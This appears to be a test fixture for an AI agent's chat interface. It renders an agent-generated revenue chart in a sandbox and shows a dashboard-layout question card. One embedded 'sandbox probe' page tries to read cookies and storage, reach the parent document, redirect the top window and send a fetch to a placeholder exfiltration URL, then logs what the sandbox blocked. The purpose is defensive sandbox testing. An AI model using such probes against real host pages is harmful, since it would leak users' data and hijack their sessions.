import '@fontsource-variable/inter';
import '../../../index.css';
import { renderHtmlHandler } from '@core/component/AI/component/tool/RenderHtml';
import type { ElicitationSchema } from '@service-agent-fold/generated/types';
import type { ElicitationAnswer } from '@service-agent-harness/generated/schemas';
import { createSignal } from 'solid-js';
import { render } from 'solid-js/web';
import { ToolCard } from '../../block-agent/ui/ToolCard';
import { macroDarkTheme } from '../../theme/themes/macro-dark';
import { macroLightTheme } from '../../theme/themes/macro-light';
import { LiveQuestionCard } from '../components/LiveElicitation';

const params = new URLSearchParams(location.search);
const dark = params.get('theme') === 'dark';
document.documentElement.dataset.themeLight = String(!dark);
const theme = dark ? macroDarkTheme : macroLightTheme;
for (const [token, value] of Object.entries(theme.colorTokens)) {
  document.documentElement.style.setProperty(`--color-${token}`, value);
}

/** A typical agent page: a chart and a table on the reply's background. */
const CHART_PAGE = `<!doctype html><html><head><style>
  .kpis{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px}
  .kpi{flex:1 1 140px;padding:12px 14px;border:1px solid var(--border);border-radius:var(--radius)}
  .kpi b{display:block;font-size:22px;font-weight:600;color:var(--foreground)}
  .kpi span{color:var(--muted-foreground);font-size:12px}
  svg{display:block;width:100%;height:180px}
  table{width:100%;border-collapse:collapse;margin-top:12px;font-size:13px}
  td,th{padding:6px 4px;border-bottom:1px solid var(--border);text-align:left}
  th{color:var(--muted-foreground);font-weight:500}
  td.n{text-align:right;font-variant-numeric:tabular-nums}
  a{color:var(--accent)}
</style></head><body>
  <div class="kpis">
    <div class="kpi"><b>&euro;1.42M</b><span>Q3 revenue, +12% QoQ</span></div>
    <div class="kpi"><b>318</b><span>New customers</span></div>
    <div class="kpi"><b>94%</b><span>Gross retention</span></div>
  </div>
  <svg viewBox="0 0 400 180" preserveAspectRatio="none" role="img" aria-label="Revenue by region">
    <g id="bars"></g>
  </svg>
  <table><thead><tr><th>Region</th><th class="n">Revenue</th><th class="n">Change</th></tr></thead><tbody id="rows"></tbody></table>
  <p><a href="https://example.com/q3-report">Full Q3 report</a></p>
  <script>
    const data=[["Benelux",520],["DACH",410],["Nordics",260],["UK",230]];
    const max=Math.max(...data.map(d=>d[1]));
    const colors=["var(--chart-1)","var(--chart-2)","var(--chart-3)","var(--chart-4)"];
    document.getElementById("bars").innerHTML=data.map((d,i)=>{const h=d[1]/max*150;return '<rect x="'+(i*100+20)+'" y="'+(165-h)+'" width="60" height="'+h+'" rx="4" fill="'+colors[i]+'"/>';}).join("");
    document.getElementById("rows").innerHTML=data.map(d=>'<tr><td>'+d[0]+'</td><td class="n">&euro;'+d[1]+'k</td><td class="n">+'+(d[1]%17)+'%</td></tr>').join("");
  </script>
</body></html>`;

/**
 * A page that tries everything it must not be able to do and writes what
 * happened into itself, for the browser test to read.
 */
const PROBE_PAGE = `<!doctype html><html><body><h3 id="heading">Sandbox probe</h3><pre id="results">running</pre>
<button id="leave" onclick="location.href='https://example.com/elsewhere'">Navigate away</button>
<script>
  const out={};
  const tryIt=(name,fn)=>{try{out[name]=String(fn());}catch(e){out[name]='blocked: '+e.name;}};
  tryIt('origin',()=>self.origin);
  tryIt('cookie',()=>document.cookie);
  tryIt('localStorage',()=>localStorage.length);
  tryIt('parentDocument',()=>parent.document.title);
  tryIt('topLocation',()=>{top.location.href='https://example.com/hijack';return 'assigned';});
  tryIt('windowOpen',()=>window.open('https://example.com/popup')===null?'null':'opened');
  const show=()=>{document.getElementById('results').textContent=JSON.stringify(out,null,1);};
  addEventListener('securitypolicyviolation',e=>{(out.violations=out.violations||[]).push(e.violatedDirective);show();});
  fetch('https://example.com/exfiltrate?d=1').then(()=>{out.fetch='sent';show();},e=>{out.fetch='blocked: '+e.name;show();});
  const img=new Image();img.onload=()=>{out.image='loaded';show();};img.onerror=()=>{out.image='blocked';show();};img.src='https://example.com/pixel.png';
  show();
</script></body></html>`;

const LAYOUT_QUESTION: ElicitationSchema = {
  title: 'Layout',
  description: null,
  required: ['answer'],
  properties: [
    {
      name: 'answer',
      title: 'Layout',
      description: null,
      schema: {
        type: 'string',
        minLength: null,
        maxLength: null,
        pattern: null,
        format: null,
        default: null,
        customField: 'answer_custom',
        options: [
          {
            value: 'Sidebar',
            title: 'Sidebar',
            description: 'Recommended: navigation stays visible on desktop.',
            preview:
              '+--------+------------------------+\n| Inbox  |  Q3 revenue            |\n| Tasks  |  ▇▇▇▇▇ ▇▇▇▇ ▇▇ ▇▇      |\n| Docs   |                        |\n+--------+------------------------+',
          },
          {
            value: 'Top tabs',
            title: 'Top tabs',
            description: 'More room for content; sections one click away.',
            preview:
              '[ Inbox ][ Tasks ][ Docs ]\n+---------------------------------+\n|  Q3 revenue                     |\n|  ▇▇▇▇▇ ▇▇▇▇ ▇▇ ▇▇               |\n+---------------------------------+',
          },
          {
            value: 'Command bar',
            title: 'Command bar',
            description: 'No chrome; everything through ⌘K.',
            preview: null,
          },
        ],
      },
    },
  ],
};

const [answer, setAnswer] = createSignal<ElicitationAnswer>();

const htmlContext = (html: string, title: string, height: number) => ({
  tool: {
    id: 'fixture-call',
    name: 'RenderHtml' as const,
    data: { title, html, height },
  },
  response: {
    id: 'fixture-call',
    name: 'RenderHtml' as const,
    data: {
      documentId: '00000000-0000-4000-8000-000000000001',
      projectId: '00000000-0000-4000-8000-000000000002',
      height,
    },
  },
  chat_id: 'fixture',
  message_id: 'fixture',
  part_index: 0,
  isComplete: true,
  renderContext: {
    isStreaming: false,
    followedBy: () => false,
  },
});

const RenderHtml = renderHtmlHandler.render;

render(
  () => (
    <main class="h-dvh overflow-auto bg-page px-4 py-6 text-sm text-ink">
      <div class="mx-auto flex max-w-[728px] flex-col gap-3">
        <section aria-label="Agent reply" class="flex flex-col gap-2">
          <p>Here is Q3 by region.</p>
          {params.get('case') === 'probe' ? (
            <RenderHtml {...htmlContext(PROBE_PAGE, 'Sandbox probe', 360)} />
          ) : (
            <RenderHtml
              {...htmlContext(CHART_PAGE, 'Q3 revenue by region', 600)}
            />
          )}
          <p>Benelux carried the quarter; the UK is flat.</p>
        </section>
        <section aria-label="Agent question">
          <ToolCard
            title="Macro is asking"
            status="running"
            defaultOpen
            trailing={<span class="text-ink-muted">Waiting for you</span>}
          >
            <div class="flex flex-col gap-3 py-1">
              <div class="text-sm text-ink">
                Which layout should the dashboard use?
              </div>
              <LiveQuestionCard
                request={{ kind: 'form', schema: LAYOUT_QUESTION }}
                locked={false}
                onRespond={async (next) => {
                  setAnswer(next);
                  return true;
                }}
              />
            </div>
          </ToolCard>
          <output data-testid="answer" class="sr-only">
            {JSON.stringify(answer() ?? null)}
          </output>
        </section>
      </div>
    </main>
  ),
  document.getElementById('root')!
);
